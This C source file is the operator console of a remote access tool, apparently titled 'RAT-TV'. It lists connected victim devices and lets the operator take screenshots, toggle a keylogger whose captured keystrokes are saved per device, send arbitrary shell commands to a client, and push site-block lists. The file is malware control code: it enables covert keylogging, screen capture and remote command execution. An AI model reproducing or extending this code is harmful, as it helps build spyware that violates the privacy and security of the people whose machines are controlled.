#include "serverInterface.h"
#include "constraints.h"
#include "messageManager.h"
#include "utils.h"
#include "serverManager.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>

extern clientHandler_t clientHndler;


void initTerminal()
{
    struct termios new_tio;
    tcgetattr(STDIN_FILENO, &new_tio);
    new_tio.c_lflag &= ~(ICANON | ECHO); 
    new_tio.c_cc[VMIN] = 1;              
    new_tio.c_cc[VTIME] = 0;             
    tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);
}

void resetTerminal()
{
    struct termios default_tio;
    tcgetattr(STDIN_FILENO, &default_tio);
    default_tio.c_lflag |= (ICANON | ECHO); 
    tcsetattr(STDIN_FILENO, TCSANOW, &default_tio);
}


int printConectedDevices(int *poz)
{
    int nrDeviceuri = 0;
    char nume_deviceuri[MAX_CLIENTS][BUFFER_SIZE];

    for (int i = 0; i < clientHndler.numberClients; i++)
    {
        strcpy(nume_deviceuri[nrDeviceuri++], clientHndler.clientsAttr[clientHndler.socketsClients[i]].name);
    }

    if (*poz >= nrDeviceuri && *poz > 0)
    {
        *poz = nrDeviceuri - 1;
    }

    printf("\n\n\tDevices: \n");
    for (int i = 0; i < nrDeviceuri; i++)
    {
        if (*poz == i)
            printf("\t\t  %s <--\n", nume_deviceuri[i]);
        else
            printf("\t\t%s \n", nume_deviceuri[i]);
    }
    return nrDeviceuri;
}


void *userManagement(int clientNr)
{
    char numeDevice[30];
    strcpy(numeDevice, clientHndler.clientsAttr[clientHndler.socketsClients[clientNr]].name);
    int clientSock = clientHndler.socketsClients[clientNr];
    int exit = 0;
    message_t scr_msg;
    char BUF[SEND_BUFFER_SIZE];

    while (1)
    {
        system("clear");
        printf("\tClient: %s\n", numeDevice);
        printf("\t\t->  take screenshot; press s\n");
        printf("\t\t->  stop/start keylog; press k\n");
        printf("\t\t->  enter cmd; press c\n");
        printf("\t\t->  block sites; press b\n");
        printf("\t\texit press q\n");

        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(STDIN_FILENO, &read_fds);
        char filename[BUFFER_SIZE];
        struct timeval timeout = {0, 100000}; 
        int ready = select(STDIN_FILENO + 1, &read_fds, NULL, NULL, &timeout);

        if (ready > 0 && FD_ISSET(STDIN_FILENO, &read_fds))
        {
            char ch = getchar();
            switch (ch)
            {
            case 'q':
                exit = 1;
                break;
            case 's':
                strcpy(BUF, "");
                encapsulateMessage(&scr_msg, BUF, 'S');
                sendMessage(clientSock, &scr_msg);
                break;
            case 'b':
            {
                char filename[BUFFER_SIZE];
                snprintf(filename, sizeof(filename), "%s/%s_editor.txt", numeDevice, numeDevice); 
                
                int fd = open(filename, O_CREAT | O_RDWR, 0664);
                if (fd < 0)
                {
                    perror("Failed to open/create file");
                    break;
                }

                
                char fileBuffer[SEND_BUFFER_SIZE] = {0};
                read(fd, fileBuffer, sizeof(fileBuffer) - 1);

                
                initTerminal();

                printf("\n--- Editing File: %s ---\n", filename);
                printf("Press , to save and quit.\n\n");
                printf("%s", fileBuffer); 

                size_t cursor = strlen(fileBuffer);
                char ch;

                while (1)
                {
                    ch = getchar();

                    if (ch == ',')
                    { 
                        break;
                    }

                    if (ch == 127 && cursor > 0)
                    {
                        fileBuffer[--cursor] = '\0';
                        printf("\b \b");
                    }
                    else if (cursor < sizeof(fileBuffer) - 1)
                    { 
                        fileBuffer[cursor++] = ch;
                        fileBuffer[cursor] = '\0';
                        putchar(ch);
                    }
                }

                
                system("clear");
                // fflush(ch);
                initTerminal();

                
                lseek(fd, 0, SEEK_SET);
                ftruncate(fd, 0); 
                write(fd, fileBuffer, strlen(fileBuffer));
                close(fd);

                
                char extractBuffer[BUFFER_SIZE] = {0};
                fd = open(filename, O_RDONLY);
                read(fd, extractBuffer, BUFFER_SIZE);
                encapsulateMessage(&scr_msg, extractBuffer, 'B');
                sendMessage(clientSock, &scr_msg);
                close(fd);

                break; 
            }

            case 'k':
                strcpy(BUF, "");
                encapsulateMessage(&scr_msg, BUF, 'K');
                sendMessage(clientSock, &scr_msg);
                snprintf(filename, sizeof(filename), "%s/keylog%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name);

                mkdir(clientHndler.clientsAttr[clientSock].name, 0755);

                clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
                clientHndler.clientsAttr[clientSock].recordKeys = 1;
                break;
            case 'c':
            {
                
                struct termios original_tio, new_tio;
                tcgetattr(STDIN_FILENO, &original_tio);
                new_tio = original_tio;
                new_tio.c_lflag |= (ECHO | ICANON); 
                tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);

                
                system("clear");
                printf("Enter command here:\n\t");

                
                int pos = 0;
                char ch;
                while (1)
                {
                    ch = getchar(); 

                    if (ch == '\n')
                    { 
                        BUF[pos] = '\0';
                        break;
                    }
                    else if (ch == 127 || ch == '\b')
                    { 
                        if (pos > 0)
                        {
                            pos--;
                            printf("\b \b"); 
                        }
                    }
                    else if (pos < sizeof(BUF) - 1)
                    { 
                        BUF[pos++] = ch;
                        putchar(ch); 
                    }
                }

                
                tcsetattr(STDIN_FILENO, TCSANOW, &original_tio);

                snprintf(filename, BUFFER_SIZE, "%s/Commands_%s.txt",
                         clientHndler.clientsAttr[clientSock].name,
                         clientHndler.clientsAttr[clientSock].name);
                int fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
                char buffer[BUFFER_SIZE * 2];
                sprintf(buffer, "Output of command %s:\n", BUF);
                write(fd, buffer, strlen(buffer));
                close(fd);

                
                message_t scr_msg;
                encapsulateMessage(&scr_msg, BUF, 'C');
                sendMessage(clientSock, &scr_msg);

                break;
            }
            default:
                break;
            }
        }

        if (exit == 1)
            break;
    }

    return NULL;
}


void *serverInterface()
{
    int poz = 0;
    initTerminal();

    while (1)
    {
        system("clear");
        printf("\t██████╗  █████╗ ████████╗   ████████╗██       ██╗\n");
        printf("\t██╔══██╗██╔══██╗ ╚═██╔══╝    ╚═██╔══╝╚██     ██╔╝\n");
        printf("\t██████╔╝███████║   ██║   ███   ██║    ╚██   ██╔╝\n");
        printf("\t██╔══██╗██╔══██║   ██║         ██║     ╚██ ██╔╝   \n");
        printf("\t██║  ██║██║  ██║   ██║         ██║      ╚██╔╝   \n");
        printf("\t╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝         ╚═╝       ╚═╝   \n");

        int nrDev = printConectedDevices(&poz);

        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(STDIN_FILENO, &read_fds);

        struct timeval timeout = {0, 100000};
        int ready = select(STDIN_FILENO + 1, &read_fds, NULL, NULL, &timeout);

        if (ready > 0 && FD_ISSET(STDIN_FILENO, &read_fds))
        {
            char ch1 = getchar();
            if (ch1 == '\n' && nrDev > 0)
            {
                userManagement(poz);
                continue;
            }

            char ch = getchar(); 
            if (ch == 'A' && poz > 0)
            { 
                poz--;
            }
            else if (ch == 'B')
            {
                poz++;
            }
        }
    }

    resetTerminal();
    return NULL;
}
